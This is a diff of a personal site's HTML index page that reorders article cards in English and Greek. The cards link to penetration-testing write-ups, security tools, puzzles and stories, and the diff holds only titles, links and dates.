+      <time lang="en">03 May 2018</time>
+      <time lang="el">03 Μαϊ 2018</time>
+    </footer>
+  </a>
+</article>
+
+           
           
            
            
@@ -1377,6 +1317,118 @@ root</code></pre></div></div>
           
            
            
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/matchsticks/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/matchsticks.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Alamot&#39;s matchstick puzzles</h3>
+      <h3 class="title" lang="el">Σπιρτοσπαζοκεφαλιές</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">11 Mar 2014</time>
+      <time lang="el">11 Μαρ 2014</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/minion_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/minions.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Minion write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Minion</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">10 Apr 2018</time>
+      <time lang="el">10 Απρ 2018</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/reddish_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/reddish.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Reddish write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Reddish</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">26 Jan 2019</time>
+      <time lang="el">26 Ιαν 2019</time>
+    </footer>
+  </a>
+</article>
+
            
           
            
@@ -1547,58 +1599,6 @@ root</code></pre></div></div>
            
            
             <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/node_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/jscode.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Node write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Node</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">03 Mar 2018</time>
-      <time lang="el">03 Μαρ 2018</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
   <a href="https://alamot.github.io/querier_writeup/" class="clearfix">
     <div class="cell">
       <div class="image" style="background-image: url(https://alamot.github.io/images/querier.jpg);"></div>
@@ -1622,22 +1622,6 @@ root</code></pre></div></div>
            
            
            
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/mantis_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/mantis.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Mantis write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Mantis</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">18 Feb 2018</time>
-      <time lang="el">18 Φεβ 2018</time>
-    </footer>
-  </a>
-</article>
-
-           
           
            
            
@@ -1649,94 +1633,6 @@ root</code></pre></div></div>
           
            
            
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/rold/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/rold.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Retriever of Lost Dreams</h3>
-      <h3 class="title" lang="el">Ο Ιχνηλάτης των Χαμένων Ονείρων</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">16 Aug 2015</time>
-      <time lang="el">16 Αυγ 2015</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/matchsticks/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/matchsticks.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Alamot&#39;s matchstick puzzles</h3>
-      <h3 class="title" lang="el">Σπιρτοσπαζοκεφαλιές</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">11 Mar 2014</time>
-      <time lang="el">11 Μαρ 2014</time>
-    </footer>
-  </a>
-</article>
-
            
           
            
@@ -1802,21 +1698,177 @@ root</code></pre></div></div>
            
            
            
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
             <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/inception_writeup/" class="clearfix">
+  <a href="https://alamot.github.io/lacasadepapel_writeup/" class="clearfix">
     <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/mirror.jpg);"></div>
+      <div class="image" style="background-image: url(https://alamot.github.io/images/ace.jpg);"></div>
     </div>
     <footer>
-      <h3 class="title" lang="en">Inception write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Inception</h3>
+      <h3 class="title" lang="en">LaCasaDePapel write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του LaCasaDePapel</h3>
       <i class="fa fa-calendar"></i>
-      <time lang="en">14 Apr 2018</time>
-      <time lang="el">14 Απρ 2018</time>
+      <time lang="en">27 Jul 2019</time>
+      <time lang="el">27 Ιουλ 2019</time>
     </footer>
   </a>
 </article>
 
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/falafel_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/falafel.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Falafel write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Falafel</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">23 Jun 2018</time>
+      <time lang="el">23 Ιουν 2018</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/sense_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/pfsense.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Sense write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Sense</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">24 Mar 2018</time>
+      <time lang="el">24 Μαρ 2018</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
            
           
            
@@ -1859,20 +1911,57 @@ root</code></pre></div></div>
            
            
           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
            
            
            
             <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/falafel_writeup/" class="clearfix">
+  <a href="https://alamot.github.io/oracle/" class="clearfix">
     <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/falafel.jpg);"></div>
+      <div class="image" style="background-image: url(https://alamot.github.io/images/oracle.jpg);"></div>
     </div>
     <footer>
-      <h3 class="title" lang="en">Falafel write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Falafel</h3>
+      <h3 class="title" lang="en">Ask and you shall receive</h3>
+      <h3 class="title" lang="el">Ζήτα και θα λάβεις</h3>
       <i class="fa fa-calendar"></i>
-      <time lang="en">23 Jun 2018</time>
-      <time lang="el">23 Ιουν 2018</time>
+      <time lang="en">04 May 2019</time>
+      <time lang="el">04 Μαϊ 2019</time>
     </footer>
   </a>
 </article>
@@ -1882,257 +1971,112 @@ root</code></pre></div></div>
            
            
            
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
             <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/lacasadepapel_writeup/" class="clearfix">
+  <a href="https://alamot.github.io/xor_kpa/" class="clearfix">
     <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/ace.jpg);"></div>
+      <div class="image" style="background-image: url(https://alamot.github.io/images/keylock.jpg);"></div>
     </div>
     <footer>
-      <h3 class="title" lang="en">LaCasaDePapel write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του LaCasaDePapel</h3>
+      <h3 class="title" lang="en">Known-plaintext attack tool for XOR-encrypted data</h3>
+      <h3 class="title" lang="el">Εργαλείο επιθέσεων γνωστού αρχικού κειμένου έναντι XOR-κρυπτογραφημένων δεδομένων</h3>
       <i class="fa fa-calendar"></i>
-      <time lang="en">27 Jul 2019</time>
-      <time lang="el">27 Ιουλ 2019</time>
+      <time lang="en">22 Apr 2018</time>
+      <time lang="el">22 Απρ 2018</time>
     </footer>
   </a>
 </article>
 
-           
-          
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
            
           
            
@@ -2285,16 +2229,6 @@ root</code></pre></div></div>
            
            
            
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
             <article class="li col-sm-6 col-md-4">
   <a href="https://alamot.github.io/winrm_shell/" class="clearfix">
     <div class="cell">
@@ -2310,6 +2244,16 @@ root</code></pre></div></div>
   </a>
 </article>
 
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
            
           
            
@@ -2517,6 +2461,151 @@ root</code></pre></div></div>
            
            
            
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
             <article class="li col-sm-6 col-md-4">
   <a href="https://alamot.github.io/path_traversal_archiver/" class="clearfix">
     <div class="cell">
@@ -2532,68 +2621,6 @@ root</code></pre></div></div>
   </a>
 </article>
 
-           
-          
-           
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/oracle/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/oracle.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Ask and you shall receive</h3>
-      <h3 class="title" lang="el">Ζήτα και θα λάβεις</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">04 May 2019</time>
-      <time lang="el">04 Μαϊ 2019</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/xor_kpa/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/keylock.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Known-plaintext attack tool for XOR-encrypted data</h3>
-      <h3 class="title" lang="el">Εργαλείο επιθέσεων γνωστού αρχικού κειμένου έναντι XOR-κρυπτογραφημένων δεδομένων</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">22 Apr 2018</time>
-      <time lang="el">22 Απρ 2018</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
            
           
            
